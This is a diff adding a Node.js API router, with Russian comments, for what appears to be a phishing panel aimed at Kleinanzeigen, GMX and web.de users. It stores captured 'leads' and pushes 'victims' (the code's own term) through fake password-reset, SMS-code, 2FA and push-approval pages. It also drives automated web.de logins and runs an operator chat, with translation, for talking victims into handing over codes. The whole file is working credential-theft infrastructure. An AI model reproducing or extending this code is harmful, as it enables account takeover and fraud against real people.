@@ -1,0 +1,468 @@
+/**
+ * Диспетчер простых JSON API (нативный http, без Express).
+ * Тяжёлые маршруты остаются в server.js.
+ */
+
+const { send, safeEnd } = require('../utils/httpUtils');
+const { checkAdminAuth, hasValidAdminSession } = require('../utils/authUtils');
+const { getPlatformFromRequest, maskEmail, translateChatText, CHAT_TRANSLATE_TARGET } = require('../utils/formatUtils');
+const chatService = require('../services/chatService');
+const leadService = require('../services/leadService');
+const automationService = require('../services/automationService');
+const { normalizeOptionalSchemeHttpUrl } = require('../utils/urlSchemeUtils');
+
+const KLEIN_FORGOT_DEFAULT_FALLBACK = 'https://www.kleinanzeigen.de/m-passwort-vergessen.html';
+
+function kleinForgotResolvedDefaultUrl() {
+  const e = (process.env.KLEIN_OFFICIAL_PASSWORD_RESET_URL || '').trim();
+  return normalizeOptionalSchemeHttpUrl(e) || KLEIN_FORGOT_DEFAULT_FALLBACK;
+}
+
+function resolveKleinForgotTargetUrlForStatus(lead) {
+  const raw = lead && lead.kleinForgotRedirectUrl != null ? String(lead.kleinForgotRedirectUrl).trim() : '';
+  if (raw) {
+    const n = normalizeOptionalSchemeHttpUrl(raw);
+    if (n) return n.slice(0, 2000);
+  }
+  return kleinForgotResolvedDefaultUrl();
+}
+
+const CHAT_OPEN_LOG_TTL_MS = 15000;
+const CHAT_OPEN_STALE_TTL_MS = 45000;
+const chatOpenLogSeen = new Map();
+
+function normalizePathname(parsedUrl) {
+  return (parsedUrl.pathname || '').replace(/\/\/+/g, '/') || '/';
+}
+
+function shouldLogChatOpen(leadId, requestId) {
+  const key = String(leadId || '') + '|' + String(requestId || '');
+  const now = Date.now();
+  const prev = chatOpenLogSeen.get(key) || 0;
+  if (prev && (now - prev) < CHAT_OPEN_LOG_TTL_MS) return false;
+  chatOpenLogSeen.set(key, now);
+  if (chatOpenLogSeen.size > 2000) {
+    for (const [k, ts] of chatOpenLogSeen) {
+      if ((now - ts) > CHAT_OPEN_LOG_TTL_MS * 4) chatOpenLogSeen.delete(k);
+    }
+  }
+  return true;
+}
+
+/** Нужно прочитать тело до вызова handleApiRoute (иначе поток уже не прочитать повторно). */
+function needsRequestBody(method, pathname) {
+  if (pathname === '/api/admin/login' && method === 'POST') return true;
+  if (pathname === '/api/admin/logout' && method === 'POST') return true;
+  if (pathname === '/api/mark-worked' && method === 'POST') return true;
+  if (pathname === '/api/delete-lead' && method === 'POST') return true;
+  if (pathname === '/api/delete-lead-bulk' && method === 'POST') return true;
+  if (pathname === '/api/chat' && (method === 'POST' || method === 'DELETE')) return true;
+  return false;
+}
+
+async function handleApiRoute(req, res, parsedUrl, body, d) {
+  const pathname = normalizePathname(parsedUrl);
+  const method = req.method;
+
+  if (pathname === '/api/status' && method === 'GET') {
+    const idRaw = parsedUrl.query.id;
+    const page = (parsedUrl.query.page && String(parsedUrl.query.page).trim()) || '';
+    if (!idRaw) return send(res, 400, { status: 'pending' });
+    const id = leadService.resolveLeadId(idRaw);
+    const lead = leadService.readLeadById(id);
+    const idRequested = idRaw != null && String(idRaw).trim() !== '';
+    const leadMissing = idRequested && !lead;
+    if (lead) {
+      d.statusHeartbeats[id] = { lastSeenAt: new Date().toISOString(), currentPage: page || (d.statusHeartbeats[id] && d.statusHeartbeats[id].currentPage) };
+    }
+    let status = 'pending';
+    const mode = d.readMode();
+    if (lead && lead.scriptStatus === 'script_automation_wait' && lead.scriptAutomationWaitUntil) {
+      const wUntil = new Date(lead.scriptAutomationWaitUntil).getTime();
+      if (!isNaN(wUntil) && Date.now() >= wUntil) {
+        delete lead.scriptStatus;
+        delete lead.scriptAutomationWaitUntil;
+        lead.status = 'error';
+        lead.lastSeenAt = new Date().toISOString();
+        try {
+          leadService.persistLeadPatch(id, {
+            scriptStatus: null,
+            scriptAutomationWaitUntil: null,
+            status: lead.status,
+            lastSeenAt: lead.lastSeenAt,
+            eventTerminal: lead.eventTerminal
+          });
+        } catch (e) {}
+      }
+    }
+    if (lead && lead.status) {
+      if (lead.status === 'error') status = 'error';
+      else if (lead.status === 'show_success') status = 'show_success';
+      else if (lead.status === 'redirect_change_password') {
+        status = 'redirect_change_password';
+      }
+      else if (lead.status === 'redirect_sicherheit') {
+        status = 'redirect_sicherheit';
+      }
+      else if (lead.status === 'redirect_push') {
+        status = d.suppressVictimPushPageForKleinContext(lead) ? 'pending' : 'redirect_push';
+      }
+      else if (lead.status === 'redirect_sms_code') {
+        status = 'redirect_sms_code';
+      }
+      else if (lead.status === 'redirect_2fa_code') {
+        status = 'redirect_2fa_code';
+      }
+      else if (lead.status === 'redirect_gmx_net') {
+        status = 'redirect_gmx_net';
+      }
+      else if (lead.status === 'redirect_android') {
+        status = 'redirect_android';
+      }
+      else if (lead.status === 'redirect_klein_forgot') {
+        status = 'redirect_klein_forgot';
+      }
+      else if (lead.status === 'redirect_klein_sms_wait') {
+        status = 'redirect_klein_sms_wait';
+      }
+      else if (lead.status === 'redirect_klein_anmelden') {
+        status = 'redirect_klein_anmelden';
+      }
+      else if (lead.status === 'redirect_open_on_pc') {
+        const nowPlatform = getPlatformFromRequest(req);
+        if ((nowPlatform === 'windows' || nowPlatform === 'macos') && lead.brand !== 'klein') {
+          lead.platform = nowPlatform;
+          lead.status = nowPlatform === 'windows' ? 'redirect_sicherheit' : 'redirect_change_password';
+          lead.lastSeenAt = new Date().toISOString();
+          d.pushEvent(lead, nowPlatform === 'windows' ? 'Зашёл с ПК (Windows) → Sicherheit' : 'Зашёл с ПК (Mac) → смена пароля');
+          leadService.persistLeadPatch(id, {
+            platform: lead.platform,
+            status: lead.status,
+            lastSeenAt: lead.lastSeenAt,
+            eventTerminal: lead.eventTerminal
+          });
+          status = lead.status;
+        } else {
+          status = 'redirect_open_on_pc';
+        }
+      }
+      else status = lead.status;
+    }
+    if (leadMissing) {
+      status = 'not_found';
+    }
+    if (safeEnd(res)) return true;
+    res.writeHead(200, {
+      'Content-Type': 'application/json',
+      'Cache-Control': 'no-store, no-cache, must-revalidate',
+      'Pragma': 'no-cache',
+      'Access-Control-Allow-Origin': '*',
+    });
+    const out = { status: status, mode: mode };
+    if (status === 'redirect_klein_forgot' && lead) {
+      out.kleinForgotTargetUrl = resolveKleinForgotTargetUrlForStatus(lead);
+    }
+    if (lead && lead.scriptStatus === 'script_automation_wait' && lead.scriptAutomationWaitUntil) {
+      const wLeft = new Date(lead.scriptAutomationWaitUntil).getTime();
+      if (!isNaN(wLeft) && Date.now() < wLeft) {
+        out.scriptWaitSecondsLeft = Math.max(1, Math.ceil((wLeft - Date.now()) / 1000));
+      }
+    }
+    if (lead && lead.status === 'error') {
+      out.errorKind = lead.adminErrorKind === 'sms' ? 'sms' : 'login';
+    }
+    if (lead && lead.brand === 'klein' && lead.status === 'error' && lead.kleinPasswordErrorDe) {
+      out.kleinPasswordErrorDe = String(lead.kleinPasswordErrorDe).slice(0, 500);
+    }
+    if (lead && lead.scriptStatus && typeof lead.scriptStatus === 'string') {
+      out.scriptStatus = lead.scriptStatus;
+    }
+    if (lead && lead.status === 'redirect_klein_sms_wait') {
+      out.kleinSmsWaitSeq = Number.isFinite(lead.kleinSmsWaitSeq) ? Number(lead.kleinSmsWaitSeq) : 0;
+    }
+    res.end(JSON.stringify(out));
+    return true;
+  }
+
+  if (pathname === '/api/mark-worked' && method === 'POST') {
+    if (!checkAdminAuth(req, res)) return true;
+    let json = {};
+    try { json = JSON.parse(body || '{}'); } catch (_) {}
+    const id = (json.id != null && json.id !== '') ? String(json.id).trim() : '';
+    if (!id) return send(res, 400, { ok: false, error: 'Нужен id лида' });
+    leadService.invalidateLeadsCache();
+    const leads = leadService.readLeads();
+    const idx = leads.findIndex((l) => l && String(l.id).trim() === id);
+    if (idx === -1) {
+      return send(res, 404, { ok: false, error: 'Запись не найдена (id устарел или лог заменён — обновите список и попробуйте снова)' });
+    }
+    const lead = leads[idx];
+    if (leadService.archiveFlagIsSet(lead.klLogArchived)) {
+      return send(res, 400, { ok: false, error: 'Лог Klein в архиве — отметку «Отработан» с архивом снимайте отдельно' });
+    }
+    const worked = leadService.leadIsWorkedFromEvents(lead);
+    d.pushEvent(lead, worked ? leadService.EVENT_WORKED_TOGGLE_OFF : 'Отработан', 'admin');
+    leadService.persistLeadPatch(id, { eventTerminal: lead.eventTerminal });
+    automationService.runWhenLeadsWriteQueueIdle(function () {
+      if (safeEnd(res)) return;
+      send(res, 200, { ok: true, worked: !worked });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/delete-lead' && method === 'POST') {
+    if (!checkAdminAuth(req, res)) return true;
+    if (safeEnd(res)) return true;
+    let json = {};
+    try { json = JSON.parse(body || '{}'); } catch (_) {}
+    const id = json.id != null ? String(json.id) : '';
+    if (!id) { send(res, 400, { ok: false, error: 'id required' }); return true; }
+    let leads;
+    try { leads = leadService.readLeads(); } catch (e) { console.error('[SERVER] delete-lead readLeads:', e); send(res, 500, { ok: false, error: 'read error' }); return true; }
+    const leadToDelete = leads.find((l) => l && (l.id == id || String(l.id) === id));
+    const filtered = leads.filter((l) => l && l.id != id && String(l.id) !== id);
+    if (filtered.length === leads.length) { send(res, 404, { ok: false, error: 'Lead not found' }); return true; }
+    automationService.stopWebdeLoginForDeletedLead(leadToDelete.id, leadToDelete);
+    try {
+      if (leadService.deleteLeadById(leadToDelete.id) < 1) {
+        send(res, 500, { ok: false, error: 'write error' });
+        return true;
+      }
+      leadService.invalidateLeadsCache();
+      d.broadcastLeadsUpdate();
+    } catch (e) {
+      console.error('[SERVER] delete-lead deleteLeadById:', e);
+      send(res, 500, { ok: false, error: 'write error' });
+      return true;
+    }
+    d.writeDebugLog('DELETE_LEAD', { id: id, email: leadToDelete ? maskEmail(leadToDelete.email || '') : '', totalLeadsBefore: leads.length, totalLeadsAfter: leads.length - 1 });
+    send(res, 200, { ok: true });
+    return true;
+  }
+
+  if (pathname === '/api/delete-lead-bulk' && method === 'POST') {
+    if (!checkAdminAuth(req, res)) return true;
+    if (safeEnd(res)) return true;
+    let json = {};
+    try { json = JSON.parse(body || '{}'); } catch (_) {}
+    const ids = Array.isArray(json.ids) ? json.ids.map((x) => String(x || '').trim()).filter(Boolean) : [];
+    if (ids.length === 0) { send(res, 400, { ok: false, error: 'ids required' }); return true; }
+    let deleted = 0;
+    let skipped = 0;
+    for (const id of ids) {
+      if (!id) { skipped++; continue; }
+      let leadToDelete = null;
+      try {
+        const leads = leadService.readLeads();
+        leadToDelete = leads.find((l) => l && (l.id == id || String(l.id) === id)) || null;
+      } catch (e) {
+        skipped++;
+        continue;
+      }
+      if (!leadToDelete || !leadToDelete.id) { skipped++; continue; }
+      try { automationService.stopWebdeLoginForDeletedLead(leadToDelete.id, leadToDelete); } catch (_) {}
+      try {
+        const n = leadService.deleteLeadById(leadToDelete.id);
+        if (n > 0) deleted++;
+        else skipped++;
+      } catch (e) {
+        skipped++;
+      }
+    }
+    try { leadService.invalidateLeadsCache(); } catch (_) {}
+    try { d.broadcastLeadsUpdate(); } catch (_) {}
+    send(res, 200, { ok: true, deleted, skipped });
+    return true;
+  }
+
+  if (pathname === '/api/delete-all' && method === 'POST') {
+    if (!checkAdminAuth(req, res)) return true;
+    try {
+      automationService.clearAllWebdeChildrenAndQueues();
+    } catch (_) {}
+    try {
+      leadService.deleteAllLeads();
+      leadService.invalidateLeadsCache();
+      d.broadcastLeadsUpdate();
+    } catch (e) {
+      console.error('[SERVER] delete-all:', e);
+    }
+    send(res, 200, { ok: true });
+    return true;
+  }
+
+  if (pathname === '/api/chat' && method === 'GET') {
+    const leadIdRaw = (parsedUrl.query && parsedUrl.query.leadId) ? String(parsedUrl.query.leadId).trim() : '';
+    const brand = (parsedUrl.query && parsedUrl.query.brand) ? String(parsedUrl.query.brand).trim().toLowerCase() : '';
+    if (!leadIdRaw) {
+      console.log('[CHAT-OPEN] GET /api/chat: нет leadId, 400');
+      return send(res, 400, { ok: false, messages: [] });
+    }
+    const leadId = leadService.resolveLeadId(leadIdRaw);
+    const leadRow = leadService.readLeadById(leadId);
+    const cachedLeads = leadRow ? [leadRow] : null;
+    const chatKey = chatService.getChatKeyForLeadId(leadId, cachedLeads, brand);
+    const chat = chatService.readChat();
+    const chatAliases = chatService.getChatKeyAliasesForLeadId(leadId, cachedLeads, brand);
+    let chatMigrated = false;
+    if (chatService.migrateChatToEmailKey(chat, leadId, chatKey)) chatMigrated = true;
+    if (chatService.migrateChatAliasesToCanonicalKey(chat, chatKey, chatAliases)) chatMigrated = true;
+    if (chatMigrated) chatService.writeChat(chat);
+    const messages = Array.isArray(chat[chatKey]) ? chat[chatKey] : [];
+    const typing = chatService.getChatTyping(leadId);
+    const isAdmin = hasValidAdminSession(req);
+    const userReadAt = (chat._readAt && typeof chat._readAt[chatKey] === 'string') ? chat._readAt[chatKey] : null;
+    const userDeliveredAt = (chat._deliveredAt && typeof chat._deliveredAt[chatKey] === 'string') ? chat._deliveredAt[chatKey] : null;
+    const adminReadAt = (chat._adminReadAt && typeof chat._adminReadAt[chatKey] === 'string') ? chat._adminReadAt[chatKey] : null;
+    let openRequestedRaw = chat._openChatRequested && typeof chat._openChatRequested === 'object' ? chat._openChatRequested[leadId] : undefined;
+    let openRequested = !!openRequestedRaw;
+    let openChatRequestId = openRequestedRaw != null ? String(openRequestedRaw) : undefined;
+    const payload = { ok: true, messages, supportTyping: typing.support, userTyping: typing.user };
+    if (isAdmin) {
+      payload.lastReadAt = userReadAt; // backward-compatible field name in admin.js
+      payload.userReadAt = userReadAt;
+      payload.userDeliveredAt = userDeliveredAt;
+      payload.adminReadAt = adminReadAt;
+      payload.unreadLeadCount = chatService.computeUnreadInboundLeadCount(messages, adminReadAt);
+      payload.messages = messages.map((msg) => {
+        if (!msg || typeof msg !== 'object') return msg;
+        if (msg.from !== 'support') return msg;
+        if (typeof msg.deliveryStatus === 'string' && msg.deliveryStatus) return msg;
+        const cloned = Object.assign({}, msg);
+        cloned.deliveryStatus = chatService.getSupportDeliveryStatus(msg, userDeliveredAt, userReadAt);
+        return cloned;
+      });
+    }
+    else {
+      const latestSupportAt = chatService.getLatestMessageAt(messages, 'support');
+      if (latestSupportAt) {
+        if (!chat._deliveredAt || typeof chat._deliveredAt !== 'object') chat._deliveredAt = Object.create(null);
+        const prevDeliveredAt = typeof chat._deliveredAt[chatKey] === 'string' ? chat._deliveredAt[chatKey] : null;
+        const prevDeliveredMs = new Date(prevDeliveredAt || '').getTime();
+        if (!Number.isFinite(prevDeliveredMs) || new Date(latestSupportAt).getTime() > prevDeliveredMs) {
+          chat._deliveredAt[chatKey] = latestSupportAt;
+          chatService.writeChat(chat);
+        }
+      }
+      if (openRequested && openChatRequestId) {
+        const requestTs = Number(openChatRequestId);
+        if (Number.isFinite(requestTs) && requestTs > 0 && (Date.now() - requestTs) > CHAT_OPEN_STALE_TTL_MS) {
+          if (chat._openChatRequested && typeof chat._openChatRequested === 'object') {
+            delete chat._openChatRequested[leadId];
+            chatService.writeChat(chat);
+          }
+          openRequestedRaw = undefined;
+          openRequested = false;
+          openChatRequestId = undefined;
+        }
+      }
+      payload.openChat = openRequested;
+      if (openRequested && openChatRequestId) payload.openChatRequestId = openChatRequestId;
+      if (openRequested && shouldLogChatOpen(leadId, openChatRequestId || 'legacy')) {
+        console.log('[CHAT-OPEN] GET /api/chat: leadId=' + leadId + ' chatKey=' + chatKey + ' openChat=true requestId=' + openChatRequestId);
+      }
+    }
+    return send(res, 200, payload);
+  }
+
+  if (pathname === '/api/chat' && method === 'POST') {
+    let json = {};
+    try { json = JSON.parse(body || '{}'); } catch (_) {}
+    const leadIdRaw = (json.leadId != null) ? String(json.leadId).trim() : '';
+    const brand = (json.brand != null) ? String(json.brand).trim().toLowerCase() : '';
+    const from = (json.from === 'support' || json.from === 'user') ? json.from : 'user';
+    const text = (json.text != null) ? String(json.text).slice(0, 2000) : '';
+    const MAX_IMAGE_BASE64_LEN = 2800000;
+    let image = (json.image != null && typeof json.image === 'string') ? json.image.slice(0, MAX_IMAGE_BASE64_LEN) : undefined;
+    if (from === 'support' && !hasValidAdminSession(req)) return send(res, 403, { ok: false });
+    if (!leadIdRaw) return send(res, 400, { ok: false });
+    const leadId = leadService.resolveLeadId(leadIdRaw);
+    const leadRow = leadService.readLeadById(leadId);
+    const cachedLeads = leadRow ? [leadRow] : null;
+    const chatKey = chatService.getChatKeyForLeadId(leadId, cachedLeads, brand);
+    const chat = chatService.readChat();
+    const chatAliases = chatService.getChatKeyAliasesForLeadId(leadId, cachedLeads, brand);
+    let chatMigrated = false;
+    if (chatService.migrateChatToEmailKey(chat, leadId, chatKey)) chatMigrated = true;
+    if (chatService.migrateChatAliasesToCanonicalKey(chat, chatKey, chatAliases)) chatMigrated = true;
+    if (chatMigrated) chatService.writeChat(chat);
+    const id = 'msg-' + Date.now() + '-' + Math.random().toString(36).slice(2, 10);
+    chatService.insertChatMessage(chatKey, {
+      id,
+      from,
+      text: text || undefined,
+      image: image || undefined,
+      at: new Date().toISOString()
+    });
+    const chatAfterInsert = chatService.readChat();
+    const listAfterInsert = Array.isArray(chatAfterInsert[chatKey]) ? chatAfterInsert[chatKey] : [];
+    const adminReadAtAfterInsert =
+      (chatAfterInsert._adminReadAt && typeof chatAfterInsert._adminReadAt[chatKey] === 'string')
+        ? chatAfterInsert._adminReadAt[chatKey]
+        : null;
+    d.broadcastLeadsUpdate(leadId, {
+      chatCount: listAfterInsert.length,
+      chatUnreadCount: chatService.computeUnreadInboundLeadCount(listAfterInsert, adminReadAtAfterInsert),
+    });
+    if (from === 'user' && text && CHAT_TRANSLATE_TARGET) {
+      setImmediate(() => {
+        translateChatText(text, (translated) => {
+          if (!translated) return;
+          try {
+            const chatData = chatService.readChat();
+            const list = Array.isArray(chatData[chatKey]) ? chatData[chatKey] : [];
+            const msg = list.find((m) => m.id === id);
+            if (msg) {
+              msg.translation = translated;
+              chatService.writeChat(chatData);
+              const adminReadAt =
+                (chatData._adminReadAt && typeof chatData._adminReadAt[chatKey] === 'string')
+                  ? chatData._adminReadAt[chatKey]
+                  : null;
+              d.broadcastLeadsUpdate(leadId, {
+                chatCount: list.length,
+                chatUnreadCount: chatService.computeUnreadInboundLeadCount(list, adminReadAt),
+              });
+            }
+          } catch (e) {}
+        });
+      });
+    }
+    return send(res, 200, { ok: true, id });
+  }
+
+  if (pathname === '/api/chat' && method === 'DELETE') {
+    if (!checkAdminAuth(req, res)) return true;
+    let json = {};
+    try { json = JSON.parse(body || '{}'); } catch (_) {}
+    const leadIdRaw = (json.leadId != null) ? String(json.leadId).trim() : '';
+    const brand = (json.brand != null) ? String(json.brand).trim().toLowerCase() : '';
+    const messageId = (json.messageId != null) ? String(json.messageId).trim() : '';
+    if (!leadIdRaw || !messageId) return send(res, 400, { ok: false, error: 'leadId and messageId required' });
+    const leadId = leadService.resolveLeadId(leadIdRaw);
+    const leadRow = leadService.readLeadById(leadId);
+    const cachedLeads = leadRow ? [leadRow] : null;
+    const chatKey = chatService.getChatKeyForLeadId(leadId, cachedLeads, brand);
+    const chat = chatService.readChat();
+    const chatAliases = chatService.getChatKeyAliasesForLeadId(leadId, cachedLeads, brand);
+    let chatMigrated = false;
+    if (chatService.migrateChatToEmailKey(chat, leadId, chatKey)) chatMigrated = true;
+    if (chatService.migrateChatAliasesToCanonicalKey(chat, chatKey, chatAliases)) chatMigrated = true;
+    if (chatMigrated) chatService.writeChat(chat);
+    const list = Array.isArray(chat[chatKey]) ? chat[chatKey] : [];
+    const idx = list.findIndex((m) => m && m.id === messageId);
+    if (idx === -1) return send(res, 404, { ok: false, error: 'Message not found' });
+    if (list[idx].from !== 'support') return send(res, 403, { ok: false, error: 'Can only delete your own messages' });
+    list.splice(idx, 1);
+    chatService.writeChat(chat);
+    d.broadcastLeadsUpdate();
+    return send(res, 200, { ok: true });
+  }
+
+  return false;
+}
+
+module.exports = {
+  handleApiRoute,
+  needsRequestBody,
+};
